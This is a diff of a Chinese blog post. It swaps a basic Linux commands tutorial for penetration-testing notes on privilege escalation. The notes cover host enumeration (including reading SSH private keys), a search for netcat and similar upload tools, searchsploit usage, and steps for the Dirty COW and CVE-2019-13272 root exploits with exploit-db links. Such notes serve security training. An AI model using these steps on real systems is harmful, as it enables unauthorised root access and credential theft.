-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.txt|awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>                 <span class="comment">#打印出文本中每行的第二个字段</span></span><br></pre></td></tr></table></figure>
+<h6 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/profile </span><br><span class="line">cat /etc/bashrc </span><br><span class="line">cat ~/.bash_profile </span><br><span class="line">cat ~/.bashrc </span><br><span class="line">cat ~/.bash_logout </span><br><span class="line">env </span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/1.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span>  		<span class="comment">#-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span></span><br></pre></td></tr></table></figure>
+<h6 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/2.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,&quot;+++&quot;,$3)&#125;&#x27;</span>	<span class="comment">#打印出第一个字段与第三个字段，并在其中间添+++内容</span></span><br><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1&quot;+++&quot;$3)&#125;&#x27;</span>     </span><br></pre></td></tr></table></figure>
+<h6 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -elf</span><br><span class="line">top</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/3.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>       <span class="comment">#打印出文本中每行的最后一个字段</span></span><br><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $(NF-1)&#125;&#x27;</span>   <span class="comment">#打印出文本中每行的倒数第二个字段。</span></span><br></pre></td></tr></table></figure>
+<h6 id="应用程序信息"><a href="#应用程序信息" class="headerlink" title="应用程序信息"></a>应用程序信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archives</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/4.png"></p>
-<h4 id="2-2-sed-命令"><a href="#2-2-sed-命令" class="headerlink" title="2.2 sed 命令"></a>2.2 sed 命令</h4><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p>
-<p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p>
-<p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | sed <span class="string">&#x27;s/:/+/g&#x27;</span></span><br></pre></td></tr></table></figure>
+<h6 id="登录用户"><a href="#登录用户" class="headerlink" title="登录用户"></a>登录用户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br></pre></td></tr></table></figure>
 
-<p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的：替换为+</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/5.png"></p>
-<p><code>cat passwd |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/6.png"></p>
-<p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/7.png"></p>
-<p>以上这些命令中是以/做为该命令的定界符，如果需要修改或者匹配的字段带有/则不能再使用/做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。</p>
-<p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p>
-<p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/Users\46003\AppData\Roaming\Typora\typora-user-images\image-20220509195350587.png" alt="image-20220509195350587"></p>
-<p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/8.png"></p>
-<p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/9.png"></p>
-<p><code>sed &#39;/^192/&#39;d</code> 删除文件中所有开头是192的行。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/10.png"></p>
-<h4 id="2-3-grep-命令"><a href="#2-3-grep-命令" class="headerlink" title="2.3 grep 命令"></a>2.3 grep 命令</h4><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p>
-<p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p>
-<p>命令格式： <code>grep [options] [pattern]　[filename]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |grep root                          <span class="comment"># 只显示带有root关键字的行</span></span><br><span class="line">grep -e root passwd                            <span class="comment"># 匹配有root的行</span></span><br><span class="line">grep -v root passwd                            <span class="comment"># 忽略匹配到的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&quot;root|sshd&quot;</span>                <span class="comment"># 包含多个可能性的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;^r&#x27;</span>                       <span class="comment"># 以r开头的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;n$&#x27;</span>                       <span class="comment"># 以n结尾的行</span></span><br><span class="line">grep “root” /etc/passwd /etc/shad ow            <span class="comment"># 查询多个文件</span></span><br><span class="line">grep <span class="string">&quot;passwd&quot;</span> /etc -rn                         <span class="comment"># -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span></span><br></pre></td></tr></table></figure>
+<h6 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">cat /etc/cron*</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/11.png"></p>
-<h4 id="2-4-find-命令"><a href="#2-4-find-命令" class="headerlink" title="2.4 find 命令"></a>2.4 find 命令</h4><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
-<p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -size 1000k                <span class="comment">#从根目录查找大小为1000K的文件</span></span><br><span class="line">find   -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#在当前目录下查找文件名以1开始的文件</span></span><br><span class="line">find / -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#从根目录查找文件名以1开始的文件</span></span><br><span class="line">find / -user root            	  <span class="comment">#从根目录查找属主为root的文件</span></span><br><span class="line">find / -group root                <span class="comment">#从根目录查找属组为root的文件</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f/d               <span class="comment">#按sock类型查找，f代表文件，d代表目录</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mtime -7          <span class="comment">#搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mmin -10          <span class="comment">#搜索10分钟内当前目录下修改过的文件 </span></span><br><span class="line">find . -atime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -amin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内被访问的文件</span></span><br><span class="line">find . -ctime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -cmin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内状态被改变的文件</span></span><br><span class="line">find . -perm 777                  <span class="comment">#搜索处当前文件下符合777权限的文件</span></span><br></pre></td></tr></table></figure>
+<h6 id="SSH密钥信息"><a href="#SSH密钥信息" class="headerlink" title="SSH密钥信息"></a>SSH密钥信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>exec选项</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -<span class="built_in">exec</span> 命令2&#123;&#125;\;</span><br><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> ls -l &#123;&#125; \;</span><br><span class="line">find / -<span class="built_in">exec</span> grep <span class="string">&quot;Hello&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;*.tmp&quot;</span> -<span class="built_in">exec</span> rm -f &#123;&#125; \;           <span class="comment">#(危险)</span></span><br><span class="line">find / -name <span class="string">&quot;*&quot;</span> -ctime +2 -<span class="built_in">exec</span> rm -f &#123;&#125; \;     <span class="comment">#（危险，别敲）</span></span><br></pre></td></tr></table></figure>
+<h6 id="系统通信"><a href="#系统通信" class="headerlink" title="系统通信"></a>系统通信</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-5-ag-命令"><a href="#2-5-ag-命令" class="headerlink" title="2.5 ag 命令"></a>2.5 ag 命令</h4><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p>
-<p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ag -g &lt;File Name&gt;            <span class="comment"># 类似于 find . -name &lt;File Name&gt;</span></span><br><span class="line">ag -i PATTERN                <span class="comment"># 忽略大小写搜索含PATTERN文本</span></span><br><span class="line">ag -A [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span></span><br><span class="line">ag -B [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之前的n行文本</span></span><br><span class="line">ag -C [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span></span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   <span class="comment">#忽略某些文件目录进行搜索。</span></span><br><span class="line">ag -w PATTERN                <span class="comment">#全匹配搜索，只搜索与所搜内容完全匹配的文本。</span></span><br><span class="line">ag --java PATTERN            <span class="comment">#在java文件中搜索含PATTERN的文本。</span></span><br><span class="line">ag --xml PATTERN             <span class="comment">#在XML文件中搜索含PATTERN的</span></span><br></pre></td></tr></table></figure>
+<h6 id="日志文件分析"><a href="#日志文件分析" class="headerlink" title="日志文件分析"></a>日志文件分析</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access_log</span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/error_log</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-6-stat命令"><a href="#2-6-stat命令" class="headerlink" title="2.6 stat命令"></a>2.6 stat命令</h4><p>用于显示文件信息：</p>
-<p>用法：stat [文件或目录]</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">stat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+<h6 id="语言开发环境"><a href="#语言开发环境" class="headerlink" title="语言开发环境"></a>语言开发环境</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/12.png"></p>
-<h4 id="2-7-split-命令"><a href="#2-7-split-命令" class="headerlink" title="2.7 split 命令"></a>2.7 split 命令</h4><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>
-<p>参数：</p>
-<ul>
-<li>-b 按文件大小进行切割</li>
-<li>-l 按行数来进行切割</li>
-<li>-d 为使用数字为生成文件的后缀</li>
-<li>-a 指定后缀的长度</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 30k messages    <span class="comment"># 按照每个文件30K大小切割messages文件。</span></span><br><span class="line">split -l 300 messages    <span class="comment"># 将messages文件切割为每3行一份。</span></span><br></pre></td></tr></table></figure>
+<h6 id="上传文件环境"><a href="#上传文件环境" class="headerlink" title="上传文件环境"></a>上传文件环境</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-8-sort命令"><a href="#2-8-sort命令" class="headerlink" title="2.8 sort命令"></a>2.8 sort命令</h4><p><code>sort</code>命令是将文件进行排序，并将排序结果标准输出。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt|sort            <span class="comment">#默认的排序方式，从首字母开始</span></span><br><span class="line">cat 1.txt|sort -t         <span class="comment">#按照字典进行排序</span></span><br><span class="line">cat 1.txt|sort -n         <span class="comment">#按照数字进行排序</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x01-searchsploit"><a href="#0x01-searchsploit" class="headerlink" title="0x01 searchsploit"></a>0x01 searchsploit</h3><p>searchsploit是一个用于 Exploit-DB 的命令行搜索工具</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下载与安装：</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/offensive-security/exploit-database.git</span><br><span class="line">centos：	yum -y install exploitdb</span><br><span class="line">macos：	brew update &amp;&amp; brew install exploitdb</span><br><span class="line">kali：	apt update &amp;&amp; apt install exploitdb</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/13.png"></p>
-<h4 id="2-9-uniq-命令"><a href="#2-9-uniq-命令" class="headerlink" title="2.9 uniq 命令"></a>2.9 uniq 命令</h4><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p>
-<p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt |sort -n |uniq              <span class="comment">#排序去重</span></span><br><span class="line">cat 1.txt|sort -n |uniq -c            <span class="comment">#列出重复的次数</span></span><br><span class="line">cat 1.txt |sort -n |uniq -d           <span class="comment">#列出有哪些行是重复的</span></span><br></pre></td></tr></table></figure>
+<h6 id="searchsploit搜索exp"><a href="#searchsploit搜索exp" class="headerlink" title="searchsploit搜索exp"></a>searchsploit搜索exp</h6><p>基本搜索：会匹配标题和路径中的内</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit smb windows remote</span><br></pre></td></tr></table></figure>
 
-<p>以上系列命令可以用于日志分析：</p>
-<p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p>
-<p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code></p>
-<h4 id="2-10-nl-命令"><a href="#2-10-nl-命令" class="headerlink" title="2.10. nl 命令"></a>2.10. nl 命令</h4><p><code>nl</code>命令用于显示文件内容行号。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |nl</span><br></pre></td></tr></table></figure>
+<p>标题搜索: 只匹配标题,不会对路径中的关键词进行匹配 </p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit -t smb windows remote</span> </span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-远程连接命令"><a href="#0x03-远程连接命令" class="headerlink" title="0x03 远程连接命令"></a>0x03 远程连接命令</h3><h4 id="3-1-ssh命令"><a href="#3-1-ssh命令" class="headerlink" title="3.1 ssh命令"></a>3.1 ssh命令</h4><p><code>ssh</code>命令是Linux的远程连接工具。</p>
-<p>ssh命令：Linux的远程连接工具</p>
-<p>例如<code>ssh 192.168.2.130</code>，以当前终端用户身份远程连接IP为<code>192.168.2.130</code>的计算机。</p>
-<ul>
-<li>-l 为指定用户 如 <code>ssh -l root 192.168.2.130</code>以root用户远程登录，也可写成<code>ssh root@192.168.0.149</code></li>
-<li>-p 为指定端口号</li>
-</ul>
-<p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p>
-<p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p>
-<h4 id="3-2-linux下远程连接smb"><a href="#3-2-linux下远程连接smb" class="headerlink" title="3.2 linux下远程连接smb"></a>3.2 linux下远程连接smb</h4><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>–&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.2.130/share</code></p>
-<h4 id="3-3-rdesktop-命令"><a href="#3-3-rdesktop-命令" class="headerlink" title="3.3 rdesktop 命令"></a>3.3 rdesktop 命令</h4><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p>
-<p>用法：<code>rdesktop 192.168.0.178</code></p>
-<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
-<h3 id="0x04-URL-相关命令"><a href="#0x04-URL-相关命令" class="headerlink" title="0x04 URL 相关命令"></a>0x04 URL 相关命令</h3><p>URL，既是俗称的网址/网页链接。</p>
-<h4 id="4-1-curl-命令"><a href="#4-1-curl-命令" class="headerlink" title="4.1 curl 命令"></a>4.1 curl 命令</h4><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p>
-<p>用法：<code>curl [选项] [url]</code></p>
-<p>参数：</p>
-<ul>
-<li>-i 显示头部信息</li>
-<li>-v 显示请求全过程解析</li>
-<li>-O 下载</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">curl www.baidu.com -i</span><br><span class="line">curl www.baidu.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+<p>复制到剪贴板 -p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上 </p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">searchsploit -<span class="selector-tag">p</span> <span class="number">42315</span><span class="selector-class">.py</span> </span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/14.png"></p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/15.png"></p>
-<h4 id="4-2-wget-命令"><a href="#4-2-wget-命令" class="headerlink" title="4.2 wget 命令"></a>4.2 wget 命令</h4><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+<p>复制到文件夹 不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> -m <span class="number">42315</span>.py</span><br></pre></td></tr></table></figure>
 
-<p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Linux系统内核漏洞提权"><a href="#0x02-Linux系统内核漏洞提权" class="headerlink" title="0x02 Linux系统内核漏洞提权"></a>0x02 Linux系统内核漏洞提权</h3><blockquote>
+<p>Linux-kernel-exploits（Linux平台提权漏洞集合）</p>
+<p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</blockquote>
+<h5 id="1-1-脏牛提权"><a href="#1-1-脏牛提权" class="headerlink" title="1.1 脏牛提权"></a>1.1 脏牛提权</h5><p>漏洞编号：CVE-2016-5195 </p>
+<p>漏洞名称：脏牛（Dirty COW） </p>
+<p>漏洞危害：低权限用户利用该漏洞技术可以在 Linux 系统上实现本地提权</p>
+<p>影响范围：Linux 内核2.6.22 &lt; 3.9 (x86/x64)</p>
+<p>POC： <a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>gcc编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread ditry.c –o dirty –lcrypt</span><br></pre></td></tr></table></figure>
 
-<p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p>
+<p>替换root用户：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./dirty password</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-2-pkexec-提权漏洞"><a href="#1-2-pkexec-提权漏洞" class="headerlink" title="1.2 pkexec 提权漏洞"></a>1.2 pkexec 提权漏洞</h5><p>漏洞编号：CVE-2019-13272</p>
+<p>漏洞范围： 4.10 &lt; linux内核版本 &lt; 5.1.17 </p>
+<p>exploitdb： <a href="https://www.exploit-db.com/exploits/47163">https://www.exploit-db.com/exploits/47163</a> </p>
+<p>利用exp： <a href="https://www.exploit-db.com/download/47163">https://www.exploit-db.com/download/47163</a></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> Tested on:</span><br><span class="line"><span class="regexp">//</span> - Ubuntu <span class="number">16.04</span>.<span class="number">5</span> kernel <span class="number">4.15</span>.<span class="number">0</span>-<span class="number">29</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Ubuntu <span class="number">18.04</span>.<span class="number">1</span> kernel <span class="number">4.15</span>.<span class="number">0</span>-<span class="number">20</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Ubuntu <span class="number">19.04</span> kernel <span class="number">5.0</span>.<span class="number">0</span>-<span class="number">15</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Ubuntu Mate <span class="number">18.04</span>.<span class="number">2</span> kernel <span class="number">4.18</span>.<span class="number">0</span>-<span class="number">15</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Linux Mint <span class="number">19</span> kernel <span class="number">4.15</span>.<span class="number">0</span>-<span class="number">20</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Xubuntu <span class="number">16.04</span>.<span class="number">4</span> kernel <span class="number">4.13</span>.<span class="number">0</span>-<span class="number">36</span>-generic</span><br><span class="line"><span class="regexp">//</span> - ElementaryOS <span class="number">0.4</span>.<span class="number">1</span> <span class="number">4.8</span>.<span class="number">0</span>-<span class="number">52</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Backbox <span class="number">6</span> kernel <span class="number">4.18</span>.<span class="number">0</span>-<span class="number">21</span>-generic</span><br><span class="line"><span class="regexp">//</span> - Parrot OS <span class="number">4.5</span>.<span class="number">1</span> kernel <span class="number">4.19</span>.<span class="number">0</span>-parrot1-<span class="number">13</span>t-amd64</span><br><span class="line"><span class="regexp">//</span> - Kali kernel <span class="number">4.19</span>.<span class="number">0</span>-kali5-amd64</span><br><span class="line"><span class="regexp">//</span> - Redcore <span class="number">1806</span> (LXQT) kernel <span class="number">4.16</span>.<span class="number">16</span>-redcore</span><br><span class="line"><span class="regexp">//</span> - MX <span class="number">18.3</span> kernel <span class="number">4.19</span>.<span class="number">37</span>-<span class="number">2</span>~mx17+<span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> - RHEL <span class="number">8.0</span> kernel <span class="number">4.18</span>.<span class="number">0</span>-<span class="number">80</span>.el8.x86_64</span><br><span class="line"><span class="regexp">//</span> - Debian <span class="number">9.4</span>.<span class="number">0</span> kernel <span class="number">4.9</span>.<span class="number">0</span>-<span class="number">6</span>-amd64</span><br><span class="line"><span class="regexp">//</span> - Debian <span class="number">10.0</span>.<span class="number">0</span> kernel <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">5</span>-amd64</span><br><span class="line"><span class="regexp">//</span> - Devuan <span class="number">2.0</span>.<span class="number">0</span> kernel <span class="number">4.9</span>.<span class="number">0</span>-<span class="number">6</span>-amd64</span><br><span class="line"><span class="regexp">//</span> - SparkyLinux <span class="number">5.8</span> kernel <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">5</span>-amd64</span><br><span class="line"><span class="regexp">//</span> - Fedora Workstation <span class="number">30</span> kernel <span class="number">5.0</span>.<span class="number">9</span>-<span class="number">301</span>.fc30.x86_64</span><br><span class="line"><span class="regexp">//</span> - Manjaro <span class="number">18.0</span>.<span class="number">3</span> kernel <span class="number">4.19</span>.<span class="number">23</span>-<span class="number">1</span>-MANJARO</span><br><span class="line"><span class="regexp">//</span> - Mageia <span class="number">6</span> kernel <span class="number">4.9</span>.<span class="number">35</span>-desktop-<span class="number">1</span>.mga6</span><br><span class="line"><span class="regexp">//</span> - Antergos <span class="number">18.7</span> kernel <span class="number">4.17</span>.<span class="number">6</span>-<span class="number">1</span>-ARCH</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-3-CVE-2019-13272"><a href="#1-3-CVE-2019-13272" class="headerlink" title="1.3 CVE-2019-13272"></a>1.3 CVE-2019-13272</h5><p>漏洞范围： Linux Kernel &lt; 5.1.17</p>
+<p>exploitdb： <a href="https://www.exploit-db.com/download/47163">https://www.exploit-db.com/download/47163</a></p>
